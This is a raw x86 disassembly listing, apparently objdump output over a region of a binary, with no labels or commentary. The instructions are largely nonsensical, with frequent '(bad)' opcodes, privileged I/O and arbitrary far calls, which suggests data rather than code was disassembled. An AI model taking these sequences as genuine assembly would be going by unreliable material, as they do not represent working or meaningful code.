  42e7bf:	adc    DWORD PTR [esi],0x31
  42e7c2:	mov    ebx,0xd1cdb23f
  42e7c7:	dec    ecx
  42e7c8:	dec    ecx
  42e7c9:	sbb    ebp,ebx
  42e7cb:	stc    
  42e7cc:	shl    ah,cl
  42e7ce:	(bad)  
  42e7cf:	push   ecx
  42e7d0:	mov    ch,0x67
  42e7d2:	aas    
  42e7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e7d4:	outs   dx,BYTE PTR ds:[esi]
  42e7d5:	lahf   
  42e7d6:	clc    
  42e7d7:	jge    0x42e7aa
  42e7d9:	adc    eax,0x8ca100b5
  42e7de:	mov    edi,0x6586cb5a
  42e7e3:	mov    dl,0xa9
  42e7e5:	test   al,0x87
  42e7e7:	out    dx,al
  42e7e8:	add    eax,esi
  42e7ea:	into   
  42e7eb:	ss nop edx
  42e7ef:	push   edx
  42e7f0:	inc    ecx
  42e7f1:	loope  0x42e786
  42e7f3:	ret    
  42e7f4:	sbb    eax,0x7aefd00b
  42e7f9:	out    0xc1,al
  42e7fb:	sti    
  42e7fc:	xchg   ebp,eax
  42e7fd:	push   ebp
  42e7fe:	hlt    
  42e7ff:	test   al,0x95
  42e801:	xor    bl,bh
  42e803:	jge    0x42e7cc
  42e805:	adc    DWORD PTR [edx+edi*2-0x472e1c4e],ebx
  42e80c:	push   ebx
  42e80d:	aaa    
  42e80e:	inc    ecx
  42e80f:	je     0x42e797
  42e811:	xchg   ebx,eax
  42e812:	fld    QWORD PTR ds:0x15d73262
  42e818:	xchg   esp,eax
  42e819:	std    
  42e81a:	retf   
  42e81b:	scas   eax,DWORD PTR es:[edi]
  42e81c:	call   0x5518:0xf3723d9d
  42e823:	fimul  WORD PTR [ebx-0x2e6fef20]
  42e829:	xchg   esp,eax
  42e82a:	fsubr  QWORD PTR [esi-0x6e358b30]
  42e830:	div    DWORD PTR [esi]
  42e832:	sbb    BYTE PTR [esi+0xa3],dh
	...
  42e894:	add    BYTE PTR [eax],al
  42e896:	ret    
  42e897:	ja     0x42e8f9
  42e899:	and    al,0xf4
  42e89b:	aaa    
  42e89c:	(bad)  
  42e89d:	div    DWORD PTR [ebp+0x566f13c3]
  42e8a3:	sahf   
  42e8a4:	outs   dx,DWORD PTR ds:[esi]
  42e8a5:	stc    
  42e8a6:	mov    cl,0xf2
  42e8a8:	add    DWORD PTR [eax],eax
  42e8aa:	pop    es
  42e8ab:	add    DWORD PTR [eax],eax
  42e8ad:	add    bl,al
  42e8af:	add    al,0x85
  42e8b1:	bound  edi,QWORD PTR [edx-0x61]
  42e8b4:	or     eax,0x9c0d7b44
  42e8b9:	push   edi
  42e8ba:	cmp    al,0xae
  42e8bc:	ficom  DWORD PTR [edi]
  42e8be:	loop   0x42e8e5
  42e8c0:	and    dl,BYTE PTR [ebp+0x4b]
  42e8c3:	add    esp,0x25
  42e8c6:	xor    ecx,DWORD PTR [ebx+0x43ee4425]
  42e8cc:	add    ch,al
  42e8ce:	add    eax,ebp
  42e8d0:	inc    ebp
  42e8d1:	aam    0x30
  42e8d3:	fistp  QWORD PTR [edx+0x6a57a3d5]
  42e8d9:	int    0xd0
  42e8db:	xor    dl,BYTE PTR [edx-0x16]
  42e8de:	jno    0x42e94b
  42e8e0:	cli    
  42e8e1:	gs pop ss
  42e8e3:	mov    edi,0x451ca2ab
  42e8e8:	nop
  42e8e9:	inc    ecx
  42e8ea:	repnz mov al,0x6c
  42e8ed:	jle    0x42e922
  42e8ef:	mov    edx,0x78974fa8
  42e8f4:	arpl   WORD PTR gs:[esi+0x6b],si
  42e8f8:	int    0xdc
  42e8fa:	sub    al,0xd1
  42e8fc:	outs   dx,DWORD PTR ds:[esi]
  42e8fd:	mov    ebp,0xc44eda1c
  42e902:	dec    ecx
  42e904:	cmp    DWORD PTR [esi+0x70],ebx
  42e907:	shl    DWORD PTR [edi],0x5c
  42e90a:	sbb    dl,BYTE PTR [esi-0x2c7dfe37]
  42e910:	mov    dh,0xc5
  42e912:	and    al,bh
  42e914:	xor    eax,0x670713a8
  42e919:	cmp    DWORD PTR [eax-0x6ff92ee7],ecx
  42e91f:	shl    BYTE PTR [eax+ecx*8+0x49],1
  42e923:	outs   dx,DWORD PTR ds:[esi]
  42e924:	call   0xbc9c:0x78138314
  42e92b:	xor    DWORD PTR [eax-0x355befb4],ebp
  42e931:	lahf   
  42e932:	sub    eax,0xf794c825
  42e937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e938:	or     ebp,DWORD PTR [esi-0x239df7b6]
  42e93e:	stos   BYTE PTR es:[edi],al
  42e93f:	loopne 0x42e947
  42e941:	shl    dh,0xd4
  42e944:	jb     0x42e96b
  42e946:	pop    esp
  42e947:	rcl    DWORD PTR [ecx-0x8],1
  42e94a:	fstp   TBYTE PTR [esi]
  42e94c:	into   
  42e94d:	(bad)  
  42e94e:	out    dx,al
  42e94f:	mov    al,cl
  42e951:	xor    DWORD PTR [esi-0x7d],ecx
  42e954:	lahf   
  42e955:	jmp    0x2f735a3f
  42e95a:	sbb    DWORD PTR [edx],0xdd5ade8a
  42e960:	mov    cl,0xf5
  42e962:	sbb    bh,al
  42e964:	int3   
  42e965:	bound  ecx,QWORD PTR [edi+0x7280f8dd]
  42e96b:	inc    edx
  42e96c:	test   DWORD PTR [esi-0x50],edi
  42e96f:	pop    es
  42e970:	pop    eax
  42e971:	or     DWORD PTR ds:[ecx+0x7e],ecx
  42e975:	das    
  42e976:	mov    ds:0xfe3bcc0f,al
  42e97b:	jecxz  0x42e9a6
  42e97d:	outs   dx,BYTE PTR ds:[esi]
  42e97e:	scas   eax,DWORD PTR es:[edi]
  42e97f:	mov    esp,0x4de4ac77
  42e984:	mov    ch,0xaf
  42e986:	add    DWORD PTR [esi+eiz*4-0x71d8ffb6],0x42197eb
  42e991:	retf   
  42e992:	and    DWORD PTR ds:0xa6950f65,edx
  42e998:	or     al,BYTE PTR [edx-0x7cd0d2f3]
  42e99e:	dec    eax
  42e99f:	fwait
  42e9a0:	sbb    ebx,DWORD PTR [edx+0x6b5862cb]
  42e9a6:	imul   esp,DWORD PTR [ebx-0x53c029b2],0x29
  42e9ad:	dec    ebx
  42e9ae:	adc    edx,edx
  42e9b0:	inc    edi
  42e9b1:	inc    ebp
  42e9b2:	and    ebx,DWORD PTR [eax]
  42e9b4:	inc    edx
	...
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	out    dx,eax
  42ea23:	mov    eax,ds:0xf3b843cd
  42ea28:	add    DWORD PTR [eax],eax
  42ea2a:	pop    es
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR [eax+0x2b],ch
  42ea30:	shl    BYTE PTR [edi],cl
  42ea32:	inc    BYTE PTR [eax-0xe732e50]
  42ea38:	and    esi,0xffffff93
  42ea3b:	or     ebp,DWORD PTR [ebp+0xe]
  42ea3e:	mov    dh,BYTE PTR [ecx+edi*4-0x250b58b0]
  42ea45:	stos   BYTE PTR es:[edi],al
  42ea46:	jp     0x42ea65
  42ea48:	pop    edx
  42ea49:	es pop edx
  42ea4b:	test   DWORD PTR [ebp+0x36767dd6],edi
  42ea51:	add    BYTE PTR [edx],cl
  42ea53:	fucomp st(4)
  42ea55:	jg     0x42eaa7
  42ea57:	fisttp QWORD PTR [ebx+0x74]
  42ea5a:	pop    ecx
  42ea5b:	out    0x3d,eax
  42ea5d:	sbb    eax,0xb65a0444
  42ea62:	ror    DWORD PTR [ebx],1
  42ea64:	loopne 0x42ea3f
  42ea66:	ficom  WORD PTR [ebx-0x7aa1034]
  42ea6c:	ror    dl,1
  42ea6e:	lea    ecx,[edi+ecx*2]
  42ea71:	ror    esp,cl
  42ea73:	enter  0x69c4,0x7e
  42ea77:	pushf  
  42ea78:	push   ds
  42ea79:	push   edx
  42ea7a:	popa   
  42ea7b:	into   
  42ea7c:	in     eax,dx
  42ea7d:	call   0xb8bf:0x1f8f1e2
  42ea84:	add    eax,0xbaff6c71
  42ea89:	sti    
  42ea8a:	mov    eax,ds:0x7409a14c
  42ea8f:	rcr    esp,1
  42ea91:	push   es
  42ea92:	rcr    ecx,cl
  42ea94:	cmp    eax,0xe8e5a171
  42ea99:	cmp    BYTE PTR [eax-0x4a02e7ad],cl
  42ea9f:	mov    al,0x6
  42eaa1:	sahf   
  42eaa2:	or     cl,BYTE PTR [esi]
  42eaa4:	outs   dx,DWORD PTR ds:[esi]
  42eaa5:	jp     0x42ea60
  42eaa7:	ds push esp
  42eaa9:	push   ecx
  42eaaa:	push   ecx
  42eaab:	addr16 dec edi
  42eaad:	lods   eax,DWORD PTR ds:[esi]
  42eaae:	or     DWORD PTR [ecx-0x65f9ad7d],0x57012e1
  42eab8:	das    
  42eab9:	gs sbb edi,eax
  42eabc:	push   esp
  42eabd:	addr16 sbb eax,0x1d02aeb9
  42eac3:	push   0x5b
  42eac5:	(bad)  [edx+ebp*4-0x483a12da]
  42eacc:	xchg   DWORD PTR [esi+eiz*4+0x1dcb1e59],ebx
  42ead3:	cmp    al,0x0
  42ead5:	lods   al,BYTE PTR ds:[esi]
  42ead6:	in     eax,dx
  42ead7:	call   0xb2eb:0x7f6bb3a9
  42eade:	and    esi,DWORD PTR [edi+0x504442ba]
  42eae4:	outs   dx,DWORD PTR ds:[esi]
  42eae5:	repnz nop
  42eae7:	dec    edx
  42eae8:	inc    edi
  42eae9:	xor    al,0xab
  42eaeb:	jnp    0x42eaa9
  42eaed:	cdq    
  42eaee:	sub    eax,0x2ec215bb
  42eaf3:	sbb    DWORD PTR [ebx-0x7c4edb5c],0x33dc65ee
  42eafd:	fwait
  42eafe:	jns    0x42ea81
  42eb00:	enter  0xce6e,0x7
  42eb04:	in     eax,dx
  42eb05:	fild   QWORD PTR [edx-0x3291af4f]
  42eb0b:	mov    esp,0x130376b6
  42eb10:	les    ebp,FWORD PTR [ecx+0x6c]
  42eb13:	xchg   ebp,eax
  42eb14:	inc    esi
  42eb15:	add    al,0x4b
  42eb17:	jno    0x42eac7
  42eb19:	(bad)  
  42eb1a:	cmc    
  42eb1b:	retf   
  42eb1c:	out    0x35,eax
  42eb1e:	push   es
  42eb1f:	fcomp  DWORD PTR [edx+0x6b]
  42eb22:	sbb    al,0x24
  42eb24:	or     BYTE PTR [edx+edi*2+0x1271ad7a],dh
  42eb2b:	push   ebp
  42eb2c:	push   0x3d
  42eb2e:	enter  0xaac,0x24
  42eb32:	or     al,BYTE PTR [edx+0xe3]
	...
  42eb94:	add    BYTE PTR [eax],al
  42eb96:	jle    0x42ebd9
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi-0x7feea526],ebp
  42eba4:	ins    BYTE PTR es:[edi],dx
  42eba5:	popa   
  42eba6:	mov    edi,0x70001f4
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [edi+0x6],bh
  42ebb0:	mov    WORD PTR [eax-0x6794d2d8],cs
  42ebb6:	ss jge 0x42ebac
  42ebb9:	add    BYTE PTR [ebp+0x4e3f7072],0xd9
  42ebc0:	outs   dx,DWORD PTR ds:[esi]
  42ebc1:	add    cl,BYTE PTR [bx]
  42ebc4:	icebp  
  42ebc5:	push   ebp
  42ebc6:	outs   dx,BYTE PTR ds:[esi]
  42ebc7:	sbb    eax,0xd27b73ef
  42ebcc:	inc    ebp
  42ebcd:	into   
  42ebce:	pop    esi
  42ebcf:	mov    ah,0xa6
  42ebd1:	xor    al,0x50
  42ebd3:	das    
  42ebd4:	sbb    ebx,DWORD PTR [edi-0x72219703]
  42ebda:	sub    bh,BYTE PTR [ebx+ebx*2]
  42ebdd:	mov    bl,dh
  42ebdf:	ds test eax,0x1f6b1582
  42ebe5:	into   
  42ebe6:	sti    
  42ebe7:	call   0x614:0x5ddc87b
  42ebee:	addr16 xchg cx,ax
  42ebf1:	ins    DWORD PTR es:[edi],dx
  42ebf2:	les    esi,FWORD PTR [edx+0x799bfcb0]
  42ebf8:	mov    bh,dh
  42ebfa:	cwde   
  42ebfb:	xchg   BYTE PTR [edi-0x6],bl
  42ebfe:	mov    al,0xce
  42ec00:	frstor [eax]
  42ec02:	xchg   edx,eax
  42ec03:	xchg   ecx,eax
  42ec04:	xchg   esp,eax
  42ec05:	test   DWORD PTR [edi+ecx*4],esi
  42ec08:	inc    edx
  42ec09:	xchg   esp,eax
  42ec0a:	sub    BYTE PTR [edi-0x216f3e39],cl
  42ec10:	out    dx,eax
  42ec11:	push   esi
  42ec12:	mov    ebx,0x456e0775
  42ec17:	dec    edi
  42ec18:	je     0x42ec0c
  42ec1a:	(bad)  
  42ec1b:	cli    
  42ec1c:	aaa    
  42ec1d:	shl    BYTE PTR [ecx],cl
  42ec1f:	or     edx,DWORD PTR ds:0xd46257da
  42ec25:	sub    BYTE PTR [ebp+0x3c37f122],dl
  42ec2b:	icebp  
  42ec2c:	ds push ss
  42ec2e:	(bad)  
  42ec2f:	ins    DWORD PTR es:[edi],dx
  42ec30:	push   edx
  42ec31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec32:	int    0x1c
  42ec34:	and    cl,ah
  42ec36:	sbb    al,0xf5
  42ec38:	scas   al,BYTE PTR es:[edi]
  42ec39:	adc    bl,BYTE PTR [edx-0x10]
  42ec3c:	cmp    dh,bl
  42ec3e:	ds shr eax,0x74
  42ec42:	outs   dx,BYTE PTR ds:[esi]
  42ec43:	test   DWORD PTR [esi-0x5d886e42],0x5a7eab6e
  42ec4d:	sbb    BYTE PTR [ebx],dh
  42ec4f:	xor    ebx,DWORD PTR [edx-0x39]
  42ec52:	daa    
  42ec53:	pop    esi
  42ec54:	enter  0xe207,0x6c
  42ec58:	pop    edx
  42ec59:	inc    ecx
  42ec5a:	sbb    DWORD PTR [ecx+0x53],esp
  42ec5d:	aad    0x8e
  42ec5f:	mov    ds:0xd09580d7,al
  42ec64:	jge    0x42ebf6
  42ec66:	sub    eax,0xe7a6f600
  42ec6b:	cwde   
  42ec6c:	out    dx,al
  42ec6d:	mov    edx,0xc6e80d0d
  42ec72:	push   0xb8c4571c
  42ec77:	stos   DWORD PTR es:[edi],eax
  42ec78:	aam    0x68
  42ec7a:	and    DWORD PTR [edx-0x26],esi
  42ec7d:	pop    ebx
  42ec7e:	mov    bl,0x85
  42ec80:	mov    bh,0x52
  42ec82:	retf   0x1625
  42ec85:	lds    ebp,FWORD PTR [edi+0x75e0f29c]
  42ec8b:	and    ecx,edx
  42ec8d:	shl    eax,cl
  42ec8f:	es inc ecx
  42ec91:	enter  0x23ed,0xd0
  42ec95:	in     eax,0x91
  42ec97:	mov    ?,WORD PTR [eax+0x67]
  42ec9a:	fdiv   DWORD PTR [esi-0x9]
  42ec9d:	in     eax,dx
  42ec9e:	ret    
  42ec9f:	xor    ch,dl
  42eca1:	inc    ecx
  42eca2:	cmp    eax,0xb087aba0
  42eca7:	add    bh,BYTE PTR [esp+ebx*2+0x6c]
  42ecab:	inc    edx
  42ecac:	push   ebx
  42ecad:	jbe    0x42ecf6
  42ecaf:	mov    bl,0xb8
  42ecb1:	and    ecx,0x38
  42ecb4:	pop    ds
	...
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi+0x52f0a17f]
  42ed23:	jle    0x42ed57
  42ed25:	je     0x42eced
  42ed27:	cmc    
  42ed28:	add    DWORD PTR [eax],eax
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [ebx],al
  42ed2f:	push   esp
  42ed30:	push   cs
  42ed31:	adc    BYTE PTR [ebx+0x293e99fe],dh
  42ed37:	push   es
  42ed38:	sbb    esi,ebp
  42ed3a:	std    
  42ed3b:	xchg   ecx,eax
  42ed3c:	ja     0x42ed87
  42ed3e:	cld    
  42ed3f:	in     eax,dx
  42ed40:	inc    edi
  42ed41:	or     BYTE PTR es:[ebx+0x15],al
  42ed45:	or     BYTE PTR [ebx],cl
  42ed47:	lods   al,BYTE PTR ds:[esi]
  42ed48:	stos   BYTE PTR es:[edi],al
  42ed49:	adc    dl,dh
  42ed4b:	mov    eax,ds:0xe6b0226f
  42ed50:	mov    ds:0x6bd0952f,al
  42ed55:	sbb    eax,0x3ef8ce88
  42ed5a:	outs   dx,BYTE PTR ds:[esi]
  42ed5b:	(bad)  
  42ed5d:	popa   
  42ed5e:	mov    eax,ds:0x59fbc3e4
  42ed63:	jbe    0x42ed8b
  42ed65:	sar    DWORD PTR [ebx],1
  42ed67:	in     eax,0x3b
  42ed69:	push   0x61
  42ed6b:	or     dl,dh
  42ed6d:	push   esp
  42ed6e:	dec    edi
  42ed6f:	stos   DWORD PTR es:[edi],eax
  42ed70:	nop
  42ed71:	dec    edi
  42ed72:	pop    ss
  42ed73:	cdq    
  42ed74:	jge    0x42ed54
  42ed76:	dec    ebx
  42ed77:	inc    ecx
  42ed78:	and    ch,BYTE PTR [ebp+0x5e]
  42ed7b:	fldenv [ecx+0x5aeac950]
  42ed81:	sahf   
  42ed82:	mov    cl,ah
  42ed84:	and    DWORD PTR [esi+0x46],edx
  42ed87:	jbe    0x42eda7
  42ed89:	xor    DWORD PTR [edi],esp
  42ed8b:	xor    al,0x7
  42ed8d:	das    
  42ed8e:	enter  0x5221,0x68
  42ed92:	fidiv  DWORD PTR [edx]
  42ed94:	xor    DWORD PTR gs:[edx],esi
  42ed97:	mov    eax,0xa94d63c6
  42ed9c:	mov    ebx,0xafcf54f
  42eda1:	les    ebx,FWORD PTR [edi+eax*1]
  42eda4:	clc    
  42eda5:	add    dl,BYTE PTR [edi-0x79ab3bc8]
  42edab:	xor    bl,bh
  42edad:	in     al,0x31
  42edaf:	xchg   edx,eax
  42edb0:	js     0x42edf7
  42edb2:	popa   
  42edb3:	mov    bl,0x54
  42edb5:	inc    esi
  42edb6:	dec    eax
  42edb7:	test   eax,0xb2d0c566
  42edbc:	loope  0x42ee2a
  42edbe:	push   0x57
  42edc0:	cmp    BYTE PTR [esi-0x7064d1e8],ah
  42edc6:	neg    DWORD PTR [edi]
  42edc8:	add    al,0xee
  42edca:	jo     0x42edf0
  42edcc:	inc    ecx
  42edcd:	jno    0x42ed9a
  42edcf:	ds mov edi,0xf07ccccd
  42edd5:	jmp    0x95b7c27c
  42edda:	out    0x8,eax
  42eddc:	ins    BYTE PTR es:[edi],dx
  42eddd:	inc    ebx
  42edde:	cmp    DWORD PTR [ebx-0x128b616f],0x894d929d
  42ede8:	mov    edx,DWORD PTR [ecx+0x45e70af2]
  42edee:	mov    esp,0x33aeab7a
  42edf3:	or     cl,ch
  42edf5:	push   ecx
  42edf6:	test   eax,0x6548baaf
  42edfb:	fbld   TBYTE PTR [ecx+0xcb2ed1]
  42ee01:	dec    esi
  42ee02:	cmp    eax,ecx
  42ee04:	pop    ds
  42ee05:	aad    0x55
  42ee07:	push   ebp
  42ee08:	fmul   QWORD PTR [eax+esi*4]
  42ee0b:	into   
  42ee0c:	adc    bl,BYTE PTR [edx-0x16]
  42ee0f:	push   ebx
  42ee10:	ins    DWORD PTR es:[edi],dx
  42ee11:	ss push ecx
  42ee13:	inc    ecx
  42ee14:	js     0x42ee16
  42ee16:	mov    eax,0x3ab04221
  42ee1b:	or     eax,0x9d353c1c
  42ee20:	out    0xb5,eax
  42ee22:	xchg   DWORD PTR [edi],edx
  42ee24:	shr    DWORD PTR [edx],0xc0
  42ee27:	loope  0x42ee07
  42ee29:	and    eax,0x7cfa58a7
  42ee2e:	add    al,0x3d
  42ee30:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42ee32:	addr16 push 0xffffffd3
	...
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0x5c1df479,edi
  42eea4:	fadd   QWORD PTR [esi-0x33]
  42eea7:	test   BYTE PTR [ecx],0x0
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    BYTE PTR [edi],al
  42eeaf:	ja     0x42ee76
  42eeb1:	imul   ecx,DWORD PTR [ecx+0x4c],0x6eff3cd1
  42eeb8:	pop    ecx
  42eeb9:	fcom   QWORD PTR [ebx+0x7a2753c8]
  42eebf:	push   cs
  42eec0:	leave  
  42eec1:	outs   dx,DWORD PTR ds:[esi]
  42eec2:	mov    ds:0x65028f74,al
  42eec7:	jnp    0x42eec3
  42eec9:	stos   BYTE PTR es:[edi],al
  42eeca:	lds    esi,FWORD PTR [edx+0x33]
  42eecd:	xchg   ebp,ebx
  42eecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eed0:	inc    ecx
  42eed1:	inc    edx
  42eed3:	je     0x42eef4
  42eed5:	mov    esi,0x12989921
  42eeda:	jae    0x42ef3b
  42eedc:	add    edx,DWORD PTR [esi-0x1b5954ec]
  42eee2:	push   esi
  42eee3:	jle    0x42ef21
  42eee5:	mov    ebx,0x63b6add9
  42eeea:	cmp    esi,DWORD PTR [ebx+eax*8-0x52]
  42eeee:	inc    ecx
  42eeef:	and    BYTE PTR [edx+0x5b],bl
  42eef2:	sub    eax,0x9830136b
  42eef7:	aam    0x91
  42eef9:	shl    ch,cl
  42eefb:	pop    ebx
  42eefc:	mov    ebp,fs
  42eefe:	mov    ebx,0x48bd19b0
  42ef03:	mov    dh,0xe3
  42ef05:	mov    ds:0x4c5c4e0f,eax
  42ef0a:	jnp    0x42ef1f
  42ef0c:	mov    edx,0xb763b6ea
  42ef11:	xchg   DWORD PTR [ecx+0x50d4cbbc],eax
  42ef17:	das    
  42ef18:	and    BYTE PTR [esi-0x5],al
  42ef1b:	jecxz  0x42ef56
  42ef1d:	jl     0x42ef63
  42ef1f:	adc    cl,cl
  42ef21:	sub    eax,0xbddbd19c
  42ef26:	jmp    0x42ef00
  42ef28:	cmp    BYTE PTR [edi],bh
  42ef2a:	(bad)  
  42ef2c:	or     al,0x56
  42ef2e:	sbb    DWORD PTR [esi-0x493f738],0x8d0fe41b
  42ef38:	push   cs
  42ef39:	cmp    eax,0x6b36f3e1
  42ef3e:	and    esi,DWORD PTR [ebx+0x69]
  42ef41:	inc    edi
  42ef42:	lods   al,BYTE PTR ds:[esi]
  42ef43:	int3   
  42ef44:	rcr    ch,0xec
  42ef47:	ret    
  42ef48:	add    DWORD PTR [edx-0x3601dc0c],0x1c
  42ef4f:	lods   al,BYTE PTR ds:[esi]
  42ef50:	cmp    al,0x72
  42ef52:	(bad)  
  42ef53:	ds dec esi
  42ef55:	in     al,dx
  42ef56:	inc    edx
  42ef57:	fidivr DWORD PTR [ecx-0x61]
  42ef5a:	mov    BYTE PTR [eax-0x6042b535],dl
  42ef60:	ret    0xf288
  42ef63:	repz int 0x9c
  42ef66:	aaa    
  42ef67:	add    DWORD PTR [esi+esi*4-0x18],ebp
  42ef6b:	push   esi
  42ef6c:	rol    ebp,0x52
  42ef6f:	aaa    
  42ef70:	jae    0x42ef9f
  42ef72:	stc    
  42ef73:	mov    al,ds:0x3a3e478c
  42ef78:	jo     0x42ef35
  42ef7a:	fild   WORD PTR [ebx]
  42ef7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef7d:	les    esp,FWORD PTR [edx]
  42ef7f:	cs inc eax
  42ef81:	dec    esi
  42ef82:	jge    0x42efca
  42ef84:	aaa    
  42ef85:	ss jne 0x42efdb
  42ef88:	icebp  
  42ef89:	dec    esi
  42ef8a:	adc    al,0x98
  42ef8c:	and    ch,BYTE PTR [eax+0x444f2805]
  42ef92:	fwait
  42ef93:	sub    cl,ch
  42ef95:	inc    ecx
  42ef96:	shl    BYTE PTR [edi],cl
  42ef98:	mov    DWORD PTR [eax],0x4d79ef7a
  42ef9e:	add    eax,0x4cc8c332
  42efa3:	cli    
  42efa4:	and    dh,BYTE PTR [ebx+ecx*1]
  42efa7:	mov    al,0x22
  42efa9:	(bad)  
  42efab:	rcr    DWORD PTR [eax],1
  42efad:	retf   
  42efae:	mov    al,0x31
  42efb0:	test   al,0xe0
  42efb2:	data16 mov dh,0x13
	...
  42f015:	add    BYTE PTR [edx],dl
  42f017:	ds int 0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0x1bc4d516
  42f024:	jo     0x42efec
  42f026:	aam    0xf7
  42f028:	add    DWORD PTR [eax],eax
  42f02a:	pop    es
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    BYTE PTR [edi+eax*8-0x7c30c7d4],cl
  42f034:	push   eax
  42f035:	pop    esp
  42f036:	mul    cl
  42f038:	xchg   esp,eax
  42f039:	fidivr DWORD PTR [edi+0x3c706eeb]
  42f03f:	push   es
  42f040:	add    al,0xf8
  42f042:	mov    BYTE PTR [edx+0x3],bh
  42f045:	pop    ebx
  42f046:	out    0x15,eax
  42f048:	xor    dl,BYTE PTR [edi+0x77]
  42f04b:	pop    ebp
  42f04c:	sub    ah,BYTE PTR [edx+0x6e]
  42f04f:	or     dl,bl
  42f051:	push   ss
  42f052:	in     eax,0xd9
  42f054:	adc    al,0x84
  42f056:	inc    DWORD PTR [eax]
  42f058:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42f05a:	sbb    cl,0xa1
  42f05d:	das    
  42f05e:	iret   
  42f05f:	fmul   st(4),st
  42f061:	test   BYTE PTR [ebp+0x78],0x33
  42f065:	jmp    0x42eff1
  42f067:	repnz push 0xfffffff6
  42f06a:	mov    WORD PTR [edx],es
  42f06c:	pop    edx
  42f06d:	in     al,0xf0
  42f06f:	ss cwde 
  42f071:	call   0xd845b613
  42f076:	xchg   ebp,eax
  42f077:	jns    0x42f0f2
  42f079:	xor    edx,0xffffffd3
  42f07c:	and    ebp,DWORD PTR [edx+0x44]
  42f07f:	xor    DWORD PTR [eax-0xf2c4610],edi
  42f085:	hlt    
  42f086:	or     BYTE PTR [ecx-0x69],0x3a
  42f08a:	jge    0x42f0f3
  42f08c:	pusha  
  42f08d:	cmp    eax,0xffffffa0
  42f090:	xor    bh,BYTE PTR [esi+0x7568cb34]
  42f096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f097:	fisubr DWORD PTR [ebp-0x62]
  42f09a:	dec    esp
  42f09b:	inc    esp
  42f09c:	xchg   ebp,eax
  42f09d:	dec    ebx
  42f09e:	call   0x522b:0x9892ddac
  42f0a5:	push   ecx
  42f0a6:	sahf   
  42f0a7:	dec    edx
  42f0a8:	lods   eax,DWORD PTR ds:[esi]
  42f0a9:	test   al,0x6d
  42f0ab:	sub    edi,DWORD PTR [edi]
  42f0ad:	pop    ds
  42f0ae:	fsub   QWORD PTR [eax+0x65]
  42f0b1:	fmul   DWORD PTR [edi]
  42f0b3:	xlat   BYTE PTR ds:[ebx]
  42f0b4:	mov    dl,cl
  42f0b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0b7:	jecxz  0x42f071
  42f0b9:	sub    eax,0x54b75e69
  42f0be:	inc    edi
  42f0bf:	(bad)  
  42f0c0:	push   edx
  42f0c1:	push   eax
  42f0c2:	cli    
  42f0c3:	mov    dl,dh
  42f0c5:	fisttp WORD PTR ds:0x12a0e6f3
  42f0cb:	test   dh,0x22
  42f0ce:	push   ebx
  42f0cf:	mov    dh,0x9
  42f0d1:	or     ecx,ebx
  42f0d3:	retf   0x2fa9
  42f0d6:	retf   0xe992
  42f0d9:	pop    ebp
  42f0da:	mov    bl,0x57
  42f0dc:	mov    ecx,ds
  42f0de:	arpl   bp,di
  42f0e0:	fld    TBYTE PTR [ebp-0x295e8151]
  42f0e6:	sti    
  42f0e7:	int    0xb6
  42f0e9:	pusha  
  42f0ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f0eb:	xor    DWORD PTR [edi-0x52],0x95837f9a
  42f0f2:	sti    
  42f0f3:	mov    ebp,DWORD PTR [esi-0x2e]
  42f0f6:	xor    ch,BYTE PTR [ecx-0x3a57b13d]
  42f0fc:	not    DWORD PTR [eax]
  42f0fe:	pop    ss
  42f0ff:	fld    QWORD PTR [esi]
  42f101:	jmp    0x42f0c3
  42f103:	ret    
  42f104:	mov    DWORD PTR [ecx+0x1a],0x143be7d9
  42f10b:	into   
  42f10c:	imul   edi,DWORD PTR [esi+0x0],0xffffff9c
  42f110:	rcr    DWORD PTR ds:0xad0da79,cl
  42f116:	jno    0x42f111
  42f118:	adc    DWORD PTR [ecx],ecx
  42f11a:	(bad)  
  42f11b:	rcr    BYTE PTR [ebx+0x3d],0x33
  42f11f:	jae    0x42f16b
  42f121:	push   es
  42f122:	popf   
  42f123:	dec    eax
  42f124:	data16 fstp TBYTE PTR [ebp+0x15]
  42f128:	ret    0x2f28
  42f12b:	add    BYTE PTR [edi-0x6e9f185b],0xb1
  42f132:	cmp    bl,BYTE PTR [edx+ecx*1+0x0]
	...
  42f196:	pop    edx
  42f197:	es jecxz 0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f161
  42f1a3:	mov    dh,0xb8
  42f1a5:	(bad)  
  42f1a6:	(bad)  
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    bh,bh
  42f1af:	out    0xa3,eax
  42f1b1:	mov    dl,0xf6
  42f1b3:	int3   
  42f1b4:	fdivr  QWORD PTR [ebx-0x2e]
  42f1b7:	cmp    ebp,esi
  42f1b9:	(bad)  
